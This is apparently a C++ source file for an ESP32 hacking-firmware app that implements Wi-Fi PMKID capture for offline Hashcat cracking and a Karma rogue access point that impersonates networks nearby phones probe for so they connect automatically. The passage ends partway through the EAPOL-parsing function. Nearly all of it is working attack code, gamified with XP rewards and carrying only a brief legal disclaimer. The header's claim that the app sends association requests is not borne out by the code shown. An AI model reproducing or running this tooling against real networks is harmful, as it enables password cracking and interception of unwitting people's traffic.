/**
 * @file wifi_mastery_app.cpp
 * @brief WiFi Mastery App – PMKID capture and Karma attack for HackOS.
 *
 * Implements:
 *  - **PMKID Capture**: Sends an association request to a target AP to
 *    solicit the first EAPOL message containing the PMKID.  The captured
 *    PMKID is saved as a `.pcap` file on the SD card for offline
 *    cracking with Hashcat (mode 22000).
 *  - **Karma Attack**: Listens for Probe Request frames broadcast by
 *    nearby devices (phones looking for remembered networks) and
 *    instantly creates a SoftAP with the requested SSID so the device
 *    auto-connects without user interaction.
 *
 * Uses the HackOSApp lifecycle so all work runs cooperatively inside the
 * Core_Task loop (on_update) without blocking.
 *
 * @warning **Legal notice**: Capturing PMKID hashes or performing Karma
 * attacks against networks or devices you do not own or have explicit
 * written authorisation to test is illegal in most jurisdictions.
 */

#include "apps/wifi_mastery_app.h"

#include <cstdio>
#include <cstring>
#include <new>

#include <esp_log.h>
#include <esp_wifi.h>
#include <freertos/FreeRTOS.h>

#include "apps/hackos_app.h"
#include "core/event.h"
#include "core/event_system.h"
#include "hardware/display.h"
#include "hardware/input.h"
#include "hardware/radio/frame_parser_80211.h"
#include "hardware/wireless.h"
#include "storage/vfs.h"
#include "ui/widgets.h"

static constexpr const char *TAG_WM = "WiFiMastery";

namespace
{

// ── Tunables ──────────────────────────────────────────────────────────────────

static constexpr size_t  MAX_DISCOVERED_APS     = 16U;
static constexpr size_t  MAX_PROBE_SSIDS        = 16U;
static constexpr size_t  SSID_MAX_LEN           = 32U;
static constexpr size_t  AP_LABEL_BUF_LEN       = 32U;
static constexpr size_t  PMKID_LEN              = 16U;
static constexpr size_t  PCAP_SNAP_LEN          = 65535U;
static constexpr uint32_t PMKID_TIMEOUT_MS      = 15000U;
static constexpr uint32_t KARMA_PROBE_TIMEOUT_MS = 30000U;
static constexpr uint32_t KARMA_AP_DURATION_MS  = 60000U;
static constexpr uint8_t  KARMA_AP_CHANNEL      = 6U;

// ── PCAP file header constants (linktype IEEE 802.11) ────────────────────────

static constexpr uint32_t PCAP_MAGIC         = 0xA1B2C3D4U;
static constexpr uint16_t PCAP_VERSION_MAJOR = 2U;
static constexpr uint16_t PCAP_VERSION_MINOR = 4U;
static constexpr uint32_t PCAP_LINKTYPE_IEEE80211 = 105U;

// ── State machine ────────────────────────────────────────────────────────────

enum class MasteryState : uint8_t
{
    MENU_MAIN,
    PMKID_SCAN,        ///< Scanning for APs to target
    PMKID_TARGET_LIST, ///< Select AP for PMKID capture
    PMKID_CAPTURING,   ///< Waiting for PMKID from target AP
    PMKID_DONE,        ///< PMKID captured or timed out
    KARMA_LISTENING,   ///< Listening for Probe Requests
    KARMA_AP_ACTIVE,   ///< Fake AP running with karma'd SSID
};

// ── Discovered AP entry ──────────────────────────────────────────────────────

struct DiscoveredAp
{
    uint8_t bssid[6];
    char    ssid[33];
    int8_t  rssi;
    uint8_t channel;
};

// ── Captured Probe Request entry ─────────────────────────────────────────────

struct ProbeEntry
{
    char    ssid[33];       ///< SSID requested by the device
    uint8_t srcMac[6];      ///< MAC of the requesting device
    int8_t  rssi;
    uint32_t timestampMs;
};

// ── PMKID capture result ─────────────────────────────────────────────────────

struct PmkidResult
{
    uint8_t pmkid[PMKID_LEN];
    uint8_t apMac[6];
    uint8_t staMac[6];
    char    ssid[33];
    bool    captured;
};

// ── Static menu labels ───────────────────────────────────────────────────────

static constexpr size_t MAIN_MENU_COUNT = 3U;
static const char *const MAIN_MENU_LABELS[MAIN_MENU_COUNT] = {
    "PMKID Capture",
    "Karma Attack",
    "Back",
};

// ── Shared state for promiscuous callbacks ───────────────────────────────────

class WiFiMasteryApp;
static WiFiMasteryApp *g_masteryInstance = nullptr;

static volatile uint32_t g_masteryPkts = 0U;

// Forward declarations for static callbacks
static void storeDiscoveredApMastery(const hackos::radio::MgmtFrameInfo &info);
static void storeProbeRequest(const hackos::radio::MgmtFrameInfo &info,
                              const uint8_t *srcMac, int8_t rssi);
static void checkEapolPmkid(const uint8_t *payload, size_t len);

// ── Promiscuous RX callback ──────────────────────────────────────────────────

static void IRAM_ATTR masteryPromiscRxCb(void *buf,
                                          wifi_promiscuous_pkt_type_t type)
{
    if (buf == nullptr || g_masteryInstance == nullptr)
    {
        return;
    }

    const auto *pkt = static_cast<const wifi_promiscuous_pkt_t *>(buf);
    const uint8_t *payload = pkt->payload;
    const size_t len = static_cast<size_t>(pkt->rx_ctrl.sig_len);

    ++g_masteryPkts;

    // Data frames: check for EAPOL with PMKID
    if (type == WIFI_PKT_DATA)
    {
        checkEapolPmkid(payload, len);
        return;
    }

    // Management frames: beacons for AP discovery + probe requests for Karma
    if (type == WIFI_PKT_MGMT)
    {
        using namespace hackos::radio;
        if (isMgmtFrame(payload, len))
        {
            const MgmtFrameInfo info = parseMgmtFrame(payload, len,
                                                       pkt->rx_ctrl.rssi);
            if (!info.valid)
            {
                return;
            }

            if (info.subtype == SUBTYPE_BEACON ||
                info.subtype == SUBTYPE_PROBE_RESP)
            {
                storeDiscoveredApMastery(info);
            }
            else if (info.subtype == SUBTYPE_PROBE_REQ)
            {
                // Probe Request: addr2 is the source (client) MAC
                storeProbeRequest(info, info.addr2, info.rssi);
            }
        }
    }
}

// ── App class ─────────────────────────────────────────────────────────────────

class WiFiMasteryApp final : public hackos::HackOSApp
{
public:
    WiFiMasteryApp()
        : statusBar_(0, 0, 128, 8),
          mainMenu_(0, 20, 128, 36, 3),
          targetMenu_(0, 20, 128, 36, 3),
          state_(MasteryState::MENU_MAIN),
          needsRedraw_(true),
          discoveredCount_(0U),
          selectedTarget_(0U),
          probeCount_(0U),
          promiscActive_(false),
          captureStartMs_(0U),
          karmaStartMs_(0U),
          karmaApActive_(false),
          pmkidResult_{},
          apLabels_{},
          apPtrs_{}
    {
        std::memset(discoveredAps_, 0, sizeof(discoveredAps_));
        std::memset(probeEntries_, 0, sizeof(probeEntries_));
        std::memset(karmaSSID_, 0, sizeof(karmaSSID_));
    }

    // ── Public methods for promiscuous callbacks ─────────────────────────

    void addDiscoveredAp(const hackos::radio::MgmtFrameInfo &info)
    {
        for (size_t i = 0U; i < discoveredCount_; ++i)
        {
            if (std::memcmp(discoveredAps_[i].bssid, info.addr3, 6U) == 0)
            {
                discoveredAps_[i].rssi = info.rssi;
                if (info.ssid[0] != '\0')
                {
                    std::memcpy(discoveredAps_[i].ssid, info.ssid, 33U);
                }
                if (info.channel != 0U)
                {
                    discoveredAps_[i].channel = info.channel;
                }
                return;
            }
        }

        if (discoveredCount_ < MAX_DISCOVERED_APS)
        {
            DiscoveredAp &ap = discoveredAps_[discoveredCount_];
            std::memcpy(ap.bssid, info.addr3, 6U);
            std::memcpy(ap.ssid, info.ssid, 33U);
            ap.rssi = info.rssi;
            ap.channel = info.channel;
            ++discoveredCount_;
        }
    }

    void addProbeRequest(const char *ssid, const uint8_t *srcMac, int8_t rssi)
    {
        if (ssid == nullptr || ssid[0] == '\0')
        {
            return; // Ignore broadcast probes (empty SSID)
        }

        // Deduplicate by SSID
        for (size_t i = 0U; i < probeCount_; ++i)
        {
            if (std::strcmp(probeEntries_[i].ssid, ssid) == 0)
            {
                probeEntries_[i].rssi = rssi;
                probeEntries_[i].timestampMs = millis();
                return;
            }
        }

        if (probeCount_ < MAX_PROBE_SSIDS)
        {
            ProbeEntry &pe = probeEntries_[probeCount_];
            std::strncpy(pe.ssid, ssid, 32U);
            pe.ssid[32] = '\0';
            std::memcpy(pe.srcMac, srcMac, 6U);
            pe.rssi = rssi;
            pe.timestampMs = millis();
            ++probeCount_;
        }
    }

    void onPmkidDetected(const uint8_t *pmkid, const uint8_t *apMac,
                         const uint8_t *staMac)
    {
        if (state_ != MasteryState::PMKID_CAPTURING)
        {
            return;
        }

        std::memcpy(pmkidResult_.pmkid, pmkid, PMKID_LEN);
        std::memcpy(pmkidResult_.apMac, apMac, 6U);
        std::memcpy(pmkidResult_.staMac, staMac, 6U);

        if (selectedTarget_ < discoveredCount_)
        {
            std::memcpy(pmkidResult_.ssid,
                        discoveredAps_[selectedTarget_].ssid, 33U);
        }
        pmkidResult_.captured = true;

        ESP_LOGI(TAG_WM, "PMKID captured!");
    }

    MasteryState currentState() const { return state_; }

protected:
    // ── HackOSApp lifecycle ──────────────────────────────────────────────

    void on_alloc() override {}

    void on_start() override
    {
        statusBar_.setConnectivity(false, false);
        statusBar_.setBatteryLevel(100U);
        statusBar_.setTime(0U, 0U);
        mainMenu_.setItems(MAIN_MENU_LABELS, MAIN_MENU_COUNT);

        (void)Wireless::instance().init();

        g_masteryInstance = this;
        state_ = MasteryState::MENU_MAIN;
        needsRedraw_ = true;
        ESP_LOGI(TAG_WM, "WiFi Mastery app started");
    }

    void on_event(Event *event) override
    {
        if (event == nullptr || event->type != EventType::EVT_INPUT)
        {
            return;
        }

        const auto input = static_cast<InputManager::InputEvent>(event->arg0);
        handleInput(input);
    }

    void on_update() override
    {
        const uint32_t now = millis();

        switch (state_)
        {
        case MasteryState::PMKID_SCAN:
            // Auto-transition to target list after some APs discovered
            needsRedraw_ = true;
            break;

        case MasteryState::PMKID_CAPTURING:
            if (pmkidResult_.captured)
            {
                stopPromiscuous();
                savePmkidPcap();
                state_ = MasteryState::PMKID_DONE;
                needsRedraw_ = true;
            }
            else if ((now - captureStartMs_) > PMKID_TIMEOUT_MS)
            {
                stopPromiscuous();
                state_ = MasteryState::PMKID_DONE;
                needsRedraw_ = true;
            }
            else
            {
                needsRedraw_ = true;
            }
            break;

        case MasteryState::KARMA_LISTENING:
            needsRedraw_ = true;
            if (probeCount_ > 0U &&
                (now - karmaStartMs_) > KARMA_PROBE_TIMEOUT_MS)
            {
                // Auto-select strongest probe and start AP
                selectStrongestProbe();
                startKarmaAp();
            }
            break;

        case MasteryState::KARMA_AP_ACTIVE:
            needsRedraw_ = true;
            if ((now - karmaStartMs_) > KARMA_AP_DURATION_MS)
            {
                stopKarmaAp();
                state_ = MasteryState::MENU_MAIN;
                needsRedraw_ = true;
            }
            break;

        default:
            break;
        }
    }

    void on_draw() override
    {
        if (!needsRedraw_ && !anyWidgetDirty())
        {
            return;
        }

        auto &disp = DisplayManager::instance();
        disp.clear();
        statusBar_.draw();

        switch (state_)
        {
        case MasteryState::MENU_MAIN:
            drawTitle("WiFi Mastery");
            mainMenu_.draw();
            break;
        case MasteryState::PMKID_SCAN:
            drawPmkidScan();
            break;
        case MasteryState::PMKID_TARGET_LIST:
            drawTitle("Select Target");
            if (discoveredCount_ > 0U)
            {
                targetMenu_.draw();
            }
            else
            {
                disp.drawText(4, 28, "No APs captured");
            }
            break;
        case MasteryState::PMKID_CAPTURING:
            drawPmkidCapturing();
            break;
        case MasteryState::PMKID_DONE:
            drawPmkidDone();
            break;
        case MasteryState::KARMA_LISTENING:
            drawKarmaListening();
            break;
        case MasteryState::KARMA_AP_ACTIVE:
            drawKarmaActive();
            break;
        }

        disp.present();
        clearAllDirty();
        needsRedraw_ = false;
    }

    void on_free() override
    {
        stopPromiscuous();
        stopKarmaAp();
        freeApLabels();
        g_masteryInstance = nullptr;
        Wireless::instance().deinit();
        ESP_LOGI(TAG_WM, "WiFi Mastery app freed");
    }

private:
    StatusBar    statusBar_;
    MenuListView mainMenu_;
    MenuListView targetMenu_;

    MasteryState state_;
    bool         needsRedraw_;

    // AP discovery
    DiscoveredAp discoveredAps_[MAX_DISCOVERED_APS];
    size_t       discoveredCount_;
    size_t       selectedTarget_;

    // Karma probe capture
    ProbeEntry probeEntries_[MAX_PROBE_SSIDS];
    size_t     probeCount_;
    char       karmaSSID_[33];

    // Promiscuous state
    bool     promiscActive_;
    uint32_t captureStartMs_;
    uint32_t karmaStartMs_;
    bool     karmaApActive_;

    // PMKID result
    PmkidResult pmkidResult_;

    // AP label management
    char       *apLabels_[MAX_DISCOVERED_APS];
    const char *apPtrs_[MAX_DISCOVERED_APS];

    // ── Widget helpers ───────────────────────────────────────────────────

    bool anyWidgetDirty() const
    {
        return statusBar_.isDirty() || mainMenu_.isDirty() || targetMenu_.isDirty();
    }

    void clearAllDirty()
    {
        statusBar_.clearDirty();
        mainMenu_.clearDirty();
        targetMenu_.clearDirty();
    }

    void transitionTo(MasteryState next)
    {
        state_ = next;
        needsRedraw_ = true;
    }

    // ── Drawing helpers ──────────────────────────────────────────────────

    void drawTitle(const char *title)
    {
        DisplayManager::instance().drawText(2, 10, title);
        DisplayManager::instance().drawLine(0, 18, 127, 18);
    }

    void drawPmkidScan()
    {
        drawTitle("PMKID Scan");

        char buf[32];
        std::snprintf(buf, sizeof(buf), "APs found: %u",
                      static_cast<unsigned>(discoveredCount_));
        DisplayManager::instance().drawText(2, 22, buf);

        std::snprintf(buf, sizeof(buf), "Pkts: %lu",
                      static_cast<unsigned long>(g_masteryPkts));
        DisplayManager::instance().drawText(2, 32, buf);

        DisplayManager::instance().drawText(2, 44, "PRESS=Select target");
        DisplayManager::instance().drawText(2, 54, "LEFT=Back");
    }

    void drawPmkidCapturing()
    {
        drawTitle("PMKID Capture");

        auto &disp = DisplayManager::instance();

        if (selectedTarget_ < discoveredCount_)
        {
            char buf[32];
            const char *ssid = discoveredAps_[selectedTarget_].ssid;
            std::snprintf(buf, sizeof(buf), "T: %.18s",
                          ssid[0] != '\0' ? ssid : "[hidden]");
            disp.drawText(2, 22, buf);
        }

        const uint32_t elapsed = (millis() - captureStartMs_) / 1000U;
        char timeBuf[24];
        std::snprintf(timeBuf, sizeof(timeBuf), "Elapsed: %lus / %us",
                      static_cast<unsigned long>(elapsed),
                      static_cast<unsigned>(PMKID_TIMEOUT_MS / 1000U));
        disp.drawText(2, 34, timeBuf);

        char pktBuf[24];
        std::snprintf(pktBuf, sizeof(pktBuf), "Pkts: %lu",
                      static_cast<unsigned long>(g_masteryPkts));
        disp.drawText(2, 44, pktBuf);

        disp.drawText(2, 54, "Waiting for PMKID...");
    }

    void drawPmkidDone()
    {
        drawTitle("PMKID Result");

        auto &disp = DisplayManager::instance();

        if (pmkidResult_.captured)
        {
            disp.drawText(2, 22, "PMKID CAPTURED!");

            char hashBuf[32];
            std::snprintf(hashBuf, sizeof(hashBuf),
                          "%02X%02X%02X%02X...",
                          pmkidResult_.pmkid[0], pmkidResult_.pmkid[1],
                          pmkidResult_.pmkid[2], pmkidResult_.pmkid[3]);
            disp.drawText(2, 32, hashBuf);

            disp.drawText(2, 42, "Saved to /ext/pmkid/");
        }
        else
        {
            disp.drawText(2, 22, "No PMKID received");
            disp.drawText(2, 32, "AP may not support");
            disp.drawText(2, 42, "PMKID or timed out");
        }

        disp.drawText(2, 54, "PRESS=Back");
    }

    void drawKarmaListening()
    {
        drawTitle("Karma Listen");

        auto &disp = DisplayManager::instance();

        char buf[32];
        std::snprintf(buf, sizeof(buf), "Probes: %u",
                      static_cast<unsigned>(probeCount_));
        disp.drawText(2, 22, buf);

        // Show last few probe SSIDs
        int16_t y = 32;
        const size_t start = (probeCount_ > 3U) ? (probeCount_ - 3U) : 0U;
        for (size_t i = start; i < probeCount_ && y < 52; ++i)
        {
            char line[32];
            std::snprintf(line, sizeof(line), " %.20s %ddB",
                          probeEntries_[i].ssid,
                          static_cast<int>(probeEntries_[i].rssi));
            disp.drawText(0, y, line);
            y += 8;
        }

        disp.drawText(2, 56, "PRESS=Start AP");
    }

    void drawKarmaActive()
    {
        drawTitle("Karma AP Active");

        auto &disp = DisplayManager::instance();

        char buf[32];
        std::snprintf(buf, sizeof(buf), "SSID: %.18s", karmaSSID_);
        disp.drawText(2, 22, buf);

        const uint32_t remaining =
            (KARMA_AP_DURATION_MS - (millis() - karmaStartMs_)) / 1000U;
        char timeBuf[24];
        std::snprintf(timeBuf, sizeof(timeBuf), "Time left: %lus",
                      static_cast<unsigned long>(remaining));
        disp.drawText(2, 34, timeBuf);

        disp.drawText(2, 46, "Clients auto-connect");
        disp.drawText(2, 56, "PRESS=Stop");
    }

    // ── Input handling ───────────────────────────────────────────────────

    void handleInput(InputManager::InputEvent input)
    {
        switch (state_)
        {
        case MasteryState::MENU_MAIN:
            handleMainInput(input);
            break;
        case MasteryState::PMKID_SCAN:
            handlePmkidScanInput(input);
            break;
        case MasteryState::PMKID_TARGET_LIST:
            handleTargetInput(input);
            break;
        case MasteryState::PMKID_CAPTURING:
            if (input == InputManager::InputEvent::BUTTON_PRESS)
            {
                stopPromiscuous();
                transitionTo(MasteryState::PMKID_DONE);
            }
            break;
        case MasteryState::PMKID_DONE:
            if (input == InputManager::InputEvent::BUTTON_PRESS)
            {
                pmkidResult_ = {};
                transitionTo(MasteryState::MENU_MAIN);
            }
            break;
        case MasteryState::KARMA_LISTENING:
            handleKarmaListenInput(input);
            break;
        case MasteryState::KARMA_AP_ACTIVE:
            if (input == InputManager::InputEvent::BUTTON_PRESS)
            {
                stopKarmaAp();
                transitionTo(MasteryState::MENU_MAIN);
            }
            break;
        }
    }

    void handleMainInput(InputManager::InputEvent input)
    {
        if (input == InputManager::InputEvent::UP)
        {
            mainMenu_.moveSelection(-1);
        }
        else if (input == InputManager::InputEvent::DOWN)
        {
            mainMenu_.moveSelection(1);
        }
        else if (input == InputManager::InputEvent::BUTTON_PRESS)
        {
            switch (mainMenu_.selectedIndex())
            {
            case 0U: // PMKID Capture
                startPmkidScan();
                break;
            case 1U: // Karma Attack
                startKarmaListen();
                break;
            case 2U: // Back
            {
                const Event evt{EventType::EVT_SYSTEM, SYSTEM_EVENT_BACK,
                                0, nullptr};
                EventSystem::instance().postEvent(evt);
                break;
            }
            default:
                break;
            }
        }
        else if (input == InputManager::InputEvent::LEFT)
        {
            const Event evt{EventType::EVT_SYSTEM, SYSTEM_EVENT_BACK,
                            0, nullptr};
            EventSystem::instance().postEvent(evt);
        }
    }

    void handlePmkidScanInput(InputManager::InputEvent input)
    {
        if (input == InputManager::InputEvent::BUTTON_PRESS)
        {
            if (discoveredCount_ > 0U)
            {
                stopPromiscuous();
                buildApLabels();
                targetMenu_.setItems(apPtrs_, discoveredCount_);
                transitionTo(MasteryState::PMKID_TARGET_LIST);
            }
        }
        else if (input == InputManager::InputEvent::LEFT)
        {
            stopPromiscuous();
            transitionTo(MasteryState::MENU_MAIN);
        }
    }

    void handleTargetInput(InputManager::InputEvent input)
    {
        if (input == InputManager::InputEvent::UP)
        {
            targetMenu_.moveSelection(-1);
        }
        else if (input == InputManager::InputEvent::DOWN)
        {
            targetMenu_.moveSelection(1);
        }
        else if (input == InputManager::InputEvent::BUTTON_PRESS)
        {
            selectedTarget_ = targetMenu_.selectedIndex();
            startPmkidCapture();
        }
        else if (input == InputManager::InputEvent::LEFT)
        {
            freeApLabels();
            transitionTo(MasteryState::MENU_MAIN);
        }
    }

    void handleKarmaListenInput(InputManager::InputEvent input)
    {
        if (input == InputManager::InputEvent::BUTTON_PRESS)
        {
            if (probeCount_ > 0U)
            {
                stopPromiscuous();
                selectStrongestProbe();
                startKarmaAp();
            }
        }
        else if (input == InputManager::InputEvent::LEFT)
        {
            stopPromiscuous();
            transitionTo(MasteryState::MENU_MAIN);
        }
    }

    // ── Promiscuous mode control ─────────────────────────────────────────

    void startPromiscuous()
    {
        if (promiscActive_)
        {
            return;
        }

        g_masteryPkts = 0U;

        wifi_promiscuous_filter_t filter = {};
        filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT |
                             WIFI_PROMIS_FILTER_MASK_DATA;

        esp_wifi_set_promiscuous_filter(&filter);
        esp_wifi_set_promiscuous_rx_cb(&masteryPromiscRxCb);

        if (esp_wifi_set_promiscuous(true) == ESP_OK)
        {
            promiscActive_ = true;
            statusBar_.setConnectivity(false, true);
            ESP_LOGI(TAG_WM, "Promiscuous mode enabled");
        }
    }

    void stopPromiscuous()
    {
        if (!promiscActive_)
        {
            return;
        }

        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(nullptr);
        promiscActive_ = false;
        statusBar_.setConnectivity(false, false);
        ESP_LOGI(TAG_WM, "Promiscuous mode disabled");
    }

    // ── PMKID Capture ────────────────────────────────────────────────────

    void startPmkidScan()
    {
        discoveredCount_ = 0U;
        std::memset(discoveredAps_, 0, sizeof(discoveredAps_));
        startPromiscuous();
        transitionTo(MasteryState::PMKID_SCAN);
    }

    void startPmkidCapture()
    {
        if (selectedTarget_ >= discoveredCount_)
        {
            return;
        }

        pmkidResult_ = {};
        captureStartMs_ = millis();

        // Hop to the target AP's channel
        const DiscoveredAp &ap = discoveredAps_[selectedTarget_];
        (void)esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);

        startPromiscuous();
        transitionTo(MasteryState::PMKID_CAPTURING);

        ESP_LOGI(TAG_WM, "PMKID capture started on ch%u BSSID %02X:%02X:%02X:%02X:%02X:%02X",
                 ap.channel, ap.bssid[0], ap.bssid[1], ap.bssid[2],
                 ap.bssid[3], ap.bssid[4], ap.bssid[5]);
    }

    /// @brief Write captured PMKID to a .pcap file on the SD card.
    void savePmkidPcap()
    {
        if (!pmkidResult_.captured)
        {
            return;
        }

        auto &vfs = hackos::storage::VirtualFS::instance();

        // Generate filename with timestamp
        char filename[64];
        std::snprintf(filename, sizeof(filename),
                      "/ext/pmkid/pmkid_%lu.pcap",
                      static_cast<unsigned long>(millis()));

        fs::File f = vfs.open(filename, "w");
        if (!f)
        {
            ESP_LOGE(TAG_WM, "Failed to create PCAP file: %s", filename);
            return;
        }

        // Write PCAP global header
        struct __attribute__((packed)) PcapGlobalHeader
        {
            uint32_t magic;
            uint16_t versionMajor;
            uint16_t versionMinor;
            int32_t  thiszone;
            uint32_t sigfigs;
            uint32_t snaplen;
            uint32_t linktype;
        };

        PcapGlobalHeader gh = {};
        gh.magic = PCAP_MAGIC;
        gh.versionMajor = PCAP_VERSION_MAJOR;
        gh.versionMinor = PCAP_VERSION_MINOR;
        gh.thiszone = 0;
        gh.sigfigs = 0;
        gh.snaplen = PCAP_SNAP_LEN;
        gh.linktype = PCAP_LINKTYPE_IEEE80211;
        f.write(reinterpret_cast<const uint8_t *>(&gh), sizeof(gh));

        // Build a synthetic EAPOL frame containing the PMKID for Hashcat
        // Format: 802.11 header (24 bytes) + LLC/SNAP (8 bytes) +
        //         EAPOL header (4 bytes) + EAPOL-Key (77 bytes min with PMKID)
        static constexpr size_t SYNTH_FRAME_LEN = 24U + 8U + 4U + 95U;
        uint8_t synthFrame[SYNTH_FRAME_LEN];
        std::memset(synthFrame, 0, sizeof(synthFrame));

        // 802.11 header: data frame, To DS
        synthFrame[0] = 0x08U; // Data frame
        synthFrame[1] = 0x01U; // To DS
        // Addr1 = BSSID
        std::memcpy(&synthFrame[4], pmkidResult_.apMac, 6U);
        // Addr2 = STA MAC
        std::memcpy(&synthFrame[10], pmkidResult_.staMac, 6U);
        // Addr3 = BSSID
        std::memcpy(&synthFrame[16], pmkidResult_.apMac, 6U);

        // LLC/SNAP header for EAPOL (AA AA 03 00 00 00 88 8E)
        static constexpr uint8_t LLC_SNAP_EAPOL[8] = {
            0xAAU, 0xAAU, 0x03U, 0x00U, 0x00U, 0x00U, 0x88U, 0x8EU};
        std::memcpy(&synthFrame[24], LLC_SNAP_EAPOL, 8U);

        // EAPOL header (version=2, type=3/Key, length=91)
        synthFrame[32] = 0x02U; // Version
        synthFrame[33] = 0x03U; // Type: Key
        synthFrame[34] = 0x00U; // Length MSB
        synthFrame[35] = 91U;   // Length LSB

        // EAPOL-Key descriptor type (2 = RSN)
        synthFrame[36] = 0x02U;

        // Key Info: Pairwise + Ack (message 1/4 from AP)
        synthFrame[37] = 0x00U;
        synthFrame[38] = 0x8AU;

        // Key Data Length = 22 (PMKID KDE: 2+4+16)
        synthFrame[115] = 0x00U;
        synthFrame[116] = 22U;

        // PMKID KDE: tag=0xDD, len=20, OUI=00-0F-AC, type=4, PMKID
        synthFrame[117] = 0xDDU;
        synthFrame[118] = 20U;
        synthFrame[119] = 0x00U;
        synthFrame[120] = 0x0FU;
        synthFrame[121] = 0xACU;
        synthFrame[122] = 0x04U;
        std::memcpy(&synthFrame[123], pmkidResult_.pmkid, PMKID_LEN);

        // Write PCAP record header
        struct __attribute__((packed)) PcapRecordHeader
        {
            uint32_t tsSec;
            uint32_t tsUsec;
            uint32_t inclLen;
            uint32_t origLen;
        };

        const uint32_t nowSec = millis() / 1000U;
        PcapRecordHeader rh = {};
        rh.tsSec = nowSec;
        rh.tsUsec = 0;
        rh.inclLen = SYNTH_FRAME_LEN;
        rh.origLen = SYNTH_FRAME_LEN;
        f.write(reinterpret_cast<const uint8_t *>(&rh), sizeof(rh));

        // Write the synthetic frame
        f.write(synthFrame, SYNTH_FRAME_LEN);

        f.close();

        ESP_LOGI(TAG_WM, "PMKID saved to %s", filename);

        // Award XP
        const Event xpEvt{EventType::EVT_XP_EARNED, XP_PWN_CAPTURE, 0, nullptr};
        EventSystem::instance().postEvent(xpEvt);
    }

    // ── Karma Attack ─────────────────────────────────────────────────────

    void startKarmaListen()
    {
        probeCount_ = 0U;
        std::memset(probeEntries_, 0, sizeof(probeEntries_));
        karmaStartMs_ = millis();
        startPromiscuous();
        transitionTo(MasteryState::KARMA_LISTENING);
        ESP_LOGI(TAG_WM, "Karma: listening for Probe Requests");
    }

    void selectStrongestProbe()
    {
        if (probeCount_ == 0U)
        {
            return;
        }

        // Find the probe with strongest RSSI
        size_t best = 0U;
        for (size_t i = 1U; i < probeCount_; ++i)
        {
            if (probeEntries_[i].rssi > probeEntries_[best].rssi)
            {
                best = i;
            }
        }

        std::strncpy(karmaSSID_, probeEntries_[best].ssid, 32U);
        karmaSSID_[32] = '\0';
        ESP_LOGI(TAG_WM, "Karma: selected SSID '%s' (%ddBm)",
                 karmaSSID_, static_cast<int>(probeEntries_[best].rssi));
    }

    void startKarmaAp()
    {
        if (karmaSSID_[0] == '\0')
        {
            return;
        }

        stopPromiscuous();

        // Configure ESP32 as SoftAP with the karma'd SSID
        wifi_config_t apConfig = {};
        std::strncpy(reinterpret_cast<char *>(apConfig.ap.ssid),
                     karmaSSID_, sizeof(apConfig.ap.ssid) - 1U);
        apConfig.ap.ssid_len = static_cast<uint8_t>(std::strlen(karmaSSID_));
        apConfig.ap.channel = KARMA_AP_CHANNEL;
        apConfig.ap.authmode = WIFI_AUTH_OPEN;
        apConfig.ap.max_connection = 4U;
        apConfig.ap.beacon_interval = 100U;

        esp_wifi_set_mode(WIFI_MODE_AP);
        esp_wifi_set_config(WIFI_IF_AP, &apConfig);
        esp_wifi_start();

        karmaApActive_ = true;
        karmaStartMs_ = millis();
        statusBar_.setConnectivity(false, true);
        transitionTo(MasteryState::KARMA_AP_ACTIVE);

        ESP_LOGI(TAG_WM, "Karma AP started: SSID='%s'", karmaSSID_);

        // Award XP
        const Event xpEvt{EventType::EVT_XP_EARNED, XP_PWN_CAPTURE, 0, nullptr};
        EventSystem::instance().postEvent(xpEvt);
    }

    void stopKarmaAp()
    {
        if (!karmaApActive_)
        {
            return;
        }

        esp_wifi_set_mode(WIFI_MODE_STA);
        karmaApActive_ = false;
        statusBar_.setConnectivity(false, false);
        ESP_LOGI(TAG_WM, "Karma AP stopped");
    }

    // ── AP label management ──────────────────────────────────────────────

    void buildApLabels()
    {
        freeApLabels();

        for (size_t i = 0U; i < discoveredCount_; ++i)
        {
            apLabels_[i] = new (std::nothrow) char[AP_LABEL_BUF_LEN];
            if (apLabels_[i] != nullptr)
            {
                const DiscoveredAp &ap = discoveredAps_[i];
                const char *ssid = ap.ssid[0] != '\0' ? ap.ssid : "[hidden]";
                std::snprintf(apLabels_[i], AP_LABEL_BUF_LEN, "%.18s %ddBm",
                              ssid, static_cast<int>(ap.rssi));
            }
            apPtrs_[i] = apLabels_[i];
        }
    }

    void freeApLabels()
    {
        for (size_t i = 0U; i < MAX_DISCOVERED_APS; ++i)
        {
            delete[] apLabels_[i];
            apLabels_[i] = nullptr;
            apPtrs_[i] = nullptr;
        }
    }
};

// ── Global helpers called from promiscuous callback ──────────────────────────

void storeDiscoveredApMastery(const hackos::radio::MgmtFrameInfo &info)
{
    if (g_masteryInstance != nullptr)
    {
        g_masteryInstance->addDiscoveredAp(info);
    }
}

void storeProbeRequest(const hackos::radio::MgmtFrameInfo &info,
                       const uint8_t *srcMac, int8_t rssi)
{
    if (g_masteryInstance != nullptr)
    {
        g_masteryInstance->addProbeRequest(info.ssid, srcMac, rssi);
    }
}

/// @brief Check EAPOL data frames for PMKID in Key Data field.
///
/// PMKID is found in EAPOL Message 1/4 inside a KDE with
/// OUI 00-0F-AC type 4.  The LLC/SNAP header (AA AA 03 00 00 00 88 8E)
/// precedes the EAPOL payload.
void checkEapolPmkid(const uint8_t *payload, size_t len)
{
    if (g_masteryInstance == nullptr ||
        g_masteryInstance->currentState() != MasteryState::PMKID_CAPTURING)
    {
        return;
    }

    // Minimum: 802.11 hdr (24) + LLC/SNAP (8) + EAPOL (4) + Key (77)
    if (len < 113U)
    {
        return;
    }

    // Find LLC/SNAP EAPOL marker
    static constexpr uint8_t EAPOL_MARKER[8] = {
        0xAAU, 0xAAU, 0x03U, 0x00U, 0x00U, 0x00U, 0x88U, 0x8EU};

    const uint8_t *llcPos = nullptr;
    for (size_t i = 24U; i + 8U <= len; ++i)
    {
        if (std::memcmp(&payload[i], EAPOL_MARKER, 8U) == 0)
        {
            llcPos = &payload[i];
            break;
        }
    }

    if (llcPos == nullptr)
    {
        return;
    }

    const size_t eapolOffset = static_cast<size_t>(llcPos - payload) + 8U;

    // EAPOL-Key: descriptor type at offset +4, Key Info at +5..+6
    if (eapolOffset + 99U > len)
    {
        return;
    }

    const uint8_t descType = payload[eapolOffset + 4U];
    if (descType != 0x02U) // RSN descriptor
    {
        return;
    }

    // Key Info: check for Pairwise + Ack (message 1/4)
    const uint16_t keyInfo = (static_cast<uint16_t>(payload[eapolOffset + 5U]) << 8U) |
                             payload[eapolOffset + 6U];
